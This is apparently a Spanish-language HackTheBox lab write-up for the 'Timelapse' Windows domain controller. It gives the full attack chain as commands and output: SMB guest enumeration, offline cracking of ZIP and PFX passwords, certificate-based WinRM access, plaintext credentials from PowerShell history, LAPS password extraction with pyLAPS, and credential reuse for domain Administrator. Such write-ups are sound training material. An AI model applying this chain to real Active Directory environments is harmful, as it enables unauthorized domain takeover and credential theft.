---
icon: windows
---

# Timelapse

### Resumen

#### Detalles

| Campo                 | Detalle        |
| --------------------- | -------------- |
| **Nombre**            | Timelapse      |
| **Sistema Operativo** | Windows        |
| **Plataforma**        | HackTheBox     |
| **Fecha**             | 15/11/2026     |
| **IP Objetivo**       | 10.129.227.113 |

#### Executive Summary

La máquina **Timelapse** es un Controlador de Dominio de Active Directory (`timelapse.htb`). Con sesión `Guest` se enumeraron usuarios por RID brute force y se accedió a un recurso SMB compartido (`Shares`) de lectura pública, que contenía un backup (`winrm_backup.zip`) con un certificado cliente (`legacyy_dev_auth.pfx`) para autenticación WinRM.

El ZIP y el PFX estaban protegidos con contraseña; ambas se crackearon offline con `john` contra `rockyou.txt`. Con el certificado extraído se obtuvo acceso por WinRM como `legacyy` (autenticación por certificado de cliente, sin contraseña de dominio) y la flag de usuario. El historial de PowerShell de este usuario contenía en texto claro las credenciales de la cuenta de servicio `svc_deploy`, usadas para invocar comandos remotos.

Con `svc_deploy` se abusó de sus permisos de lectura sobre LAPS (`pyLAPS`) para extraer la contraseña de administrador local del propio controlador de dominio (`DC01$`). Esa contraseña resultó ser también válida para la cuenta de dominio `Administrator`, dando acceso total y la flag de root.

**Impacto:** compromiso total del dominio, por un recurso SMB de lectura pública con material criptográfico sensible, contraseñas protegidas con contraseñas débiles (diccionario), credenciales en texto claro en el historial de PowerShell y reutilización de la contraseña de LAPS en la cuenta de Administrador del dominio.

#### Técnicas

* SMB Enumeration
* Information Disclosure (recurso SMB público con backup de certificado WinRM)
* Cracking offline de ZIP y PFX protegidos con contraseña (`zip2john`/`pfx2john` + `john`)
* Autenticación WinRM por certificado de cliente
* Information Disclosure — credenciales en texto claro en historial de PowerShell
* Abuso de permisos de lectura LAPS (`pyLAPS`)
* Credential Reuse (contraseña LAPS reutilizada en la cuenta de Administrador)

### Information Gathering

#### Port Scanning

**TCP**

```bash
> sudo nmap -sS -Pn -n -vv --min-rate 5000 -p- 10.129.227.113 -oG allPorts
> nmap -sCV -Pn -n -v -p53,88,135,139,389,445,464,593,636,3268,3269,5986,9389,49667,49673,49674,49694 10.129.227.113
```

| Puerto       | Servicio         | Versión                                       |
| ------------ | ---------------- | --------------------------------------------- |
| 53/tcp       | domain           | Simple DNS Plus                               |
| 88/tcp       | kerberos-sec     | Microsoft Windows Kerberos                    |
| 135/tcp      | msrpc            | Microsoft Windows RPC                         |
| 139/tcp      | netbios-ssn      | Microsoft Windows netbios-ssn                 |
| 389/tcp      | ldap             | Active Directory LDAP (Domain: timelapse.htb) |
| 445/tcp      | microsoft-ds     | —                                             |
| 464/tcp      | kpasswd5         | —                                             |
| 593/tcp      | ncacn\_http      | Microsoft Windows RPC over HTTP 1.0           |
| 636/tcp      | ldapssl          | —                                             |
| 3268/tcp     | ldap             | Active Directory LDAP (Global Catalog)        |
| 3269/tcp     | globalcatLDAPssl | —                                             |
| **5986/tcp** | **ssl/wsmans**   | **WinRM sobre HTTPS**                         |
| 9389/tcp     | mc-nmf           | .NET Message Framing (AD Web Services)        |

WinRM solo expuesto en su variante SSL (5986), sin el puerto habitual 5985 — relevante para la fase de explotación (autenticación por certificado).

#### Enumeration

**SMB**

```bash
> nxc smb 10.129.227.113
```

<figure><img src="../../../.gitbook/assets/nxc smb Windows 10 - Server 2019 (DC01), dominio timelapse.htb, Null Auth permi.png" alt=""><figcaption></figcaption></figure>

\
_&#x6E;xc smb: Windows 10 / Server 2019 (DC01), dominio timelapse.htb, Null Auth permitido_

Sesión nula sin resultados útiles (`--rid-brute` y `--shares` devuelven `STATUS_ACCESS_DENIED`). Con `Guest` (sin contraseña) sí fue posible enumerar por RID brute force:

```bash
> nxc smb 10.129.227.113 -u 'Guest' -p '' --rid-brute
1601: TIMELAPSE\thecybergeek (SidTypeUser)
1602: TIMELAPSE\payl0ad (SidTypeUser)
1603: TIMELAPSE\legacyy (SidTypeUser)
1604: TIMELAPSE\sinfulz (SidTypeUser)
1605: TIMELAPSE\babywyrm (SidTypeUser)
3101: TIMELAPSE\Development (SidTypeGroup)
3102: TIMELAPSE\HelpDesk (SidTypeGroup)
3103: TIMELAPSE\svc_deploy (SidTypeUser)
```

El mismo usuario `Guest` tenía lectura sobre un recurso compartido:

```bash
> nxc smb 10.129.227.113 -u 'Guest' -p '' --shares
Shares          READ

> smbmap -H 10.129.227.113 -u 'Guest' -p '' -r "Shares" --depth 5
- Shares/Dev
winrm_backup.zip
- Shares/HelpDesk
LAPS.x64.msi
LAPS_Datasheet.docx
LAPS_OperationsGuide.docx
LAPS_TechnicalSpecification.docx
```

La carpeta `HelpDesk` confirma que la organización usa LAPS (relevante para la fase de Privesc); la carpeta `Dev` contenía un backup con material de autenticación.

### Explotación

#### Foothold

* **Vulnerabilidad:** Material de autenticación (certificado cliente WinRM) expuesto en un recurso SMB de lectura pública, protegido únicamente con contraseñas débiles.
* **Exploit:** `zip2john`/`pfx2john` + `john`, `openssl`, `evil-winrm` (autenticación por certificado).
* **Procedimiento:**

1. Se descargó y se intentó abrir el backup encontrado en `Shares/Dev`:

```bash
> smbmap -H 10.129.227.113 -u 'Guest' -p '' --download "Shares/Dev/winrm_backup.zip"
> unzip 10.129.227.113-Shares_Dev_winrm_backup.zip
[...] legacyy_dev_auth.pfx password:
```

2. El ZIP estaba protegido con contraseña; se crackeó offline:

```bash
> zip2john 10.129.227.113-Shares_Dev_winrm_backup.zip > winrm_backup.zip.hash
> john --wordlist=/usr/share/wordlists/rockyou.txt winrm_backup.zip.hash
supremelegacy
```

3. Dentro del ZIP, `legacyy_dev_auth.pfx` estaba también protegido; se crackeó igual:

```bash
> pfx2john legacyy_dev_auth.pfx > legacyy_dev_auth.pfx.hash
> john --wordlist=/usr/share/wordlists/rockyou.txt legacyy_dev_auth.pfx.hash
thuglegacy
```

4. Se extrajo el certificado y la clave privada del PFX:

```bash
> openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out legacyy_dev_auth.key
> openssl rsa -in legacyy_dev_auth.key -out legacyy_dev_auth.private.key
> openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out legacyy_dev_auth.crt
Enter Import Password: thuglegacy
```

5. Acceso por WinRM (SSL) autenticando con el certificado de cliente, sin necesidad de contraseña de dominio:

```bash
> evil-winrm -i 10.129.227.113 -S -c legacyy_dev_auth.crt -k legacyy_dev_auth.private.key
```

\
_&#x41;cceso por WinRM como legacyy mediante certificado cliente, lectura de user.txt_

<figure><img src="../../../.gitbook/assets/Acceso por WinRM como legacyy mediante certificado cliente, lectura de user.txt.png" alt=""><figcaption></figcaption></figure>

* **Evidencia:** (`user.txt`, visible en la captura anterior)

#### Privesc

* **Vulnerabilidad:** Credenciales en texto claro en el historial de PowerShell de `legacyy`, reutilizadas para invocar `pyLAPS` como `svc_deploy` y extraer la contraseña LAPS del controlador de dominio; esa contraseña resultó válida también para la cuenta de dominio `Administrator`.
* **Exploit:** lectura de `ConsoleHost_history.txt`, `pyLAPS.py`, password spray.
* **Procedimiento:**

1. El historial de PowerShell de `legacyy` quedó guardado en disco:

```
C:\Users\legacyy\appData\Roaming\Microsoft\Windows\PowerShell\PsReadLine\ConsoleHost_history.txt
```

Contenía, en texto claro, la contraseña de la cuenta de servicio `svc_deploy`, usada previamente por el propio `legacyy` para invocar comandos remotos:

```powershell
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {whoami}
```

2. Se confirmó la credencial por WinRM:

```bash
> nxc winrm 10.129.227.113 -u 'svc_deploy' -p 'E3R$Q62^12p7PLlC%KWaxuaV'
[+] timelapse.htb\svc_deploy:E3R$Q62^12p7PLlC%KWaxuaV (Pwn3d!)
```

3. Con `svc_deploy` se extrajo la contraseña de administrador local (LAPS) del controlador de dominio:

```bash
> pyLAPS.py --action get -d "timelapse.htb" -u "svc_deploy" -p 'E3R$Q62^12p7PLlC%KWaxuaV'
  | DC01$                : J#583Rg(G-j&Lj#bd&%]6;4;
```

4. Se comprobó que esa misma contraseña era válida para la cuenta de dominio `Administrator`:

```bash
> nxc smb 10.129.227.113 -u users.txt -p passwords.txt --continue-on-success
[+] timelapse.htb\Administrator:J#583Rg(G-j&Lj#bd&%]6;4; (Pwn3d!)
```

5. Acceso como `Administrator` y lectura de la flag de root:

```bash
> evil-winrm -i 10.129.227.113 -u 'Administrator' -p 'J#583Rg(G-j&Lj#bd&%]6;4;' -S
```

* **Evidencia:** (`root.txt`)

![Acceso como Administrator y lectura de root.txt](<../../../.gitbook/assets/Acceso como Administrator y lectura de root.txt.png>)

***

#### Notes

* El perfil del Administrador está en `C:\Users\TRX\` en lugar de `C:\Users\Administrator\` — la cuenta `Administrator` del dominio tiene asociado un directorio de perfil renombrado a `TRX`; la flag de root se lee desde ahí.
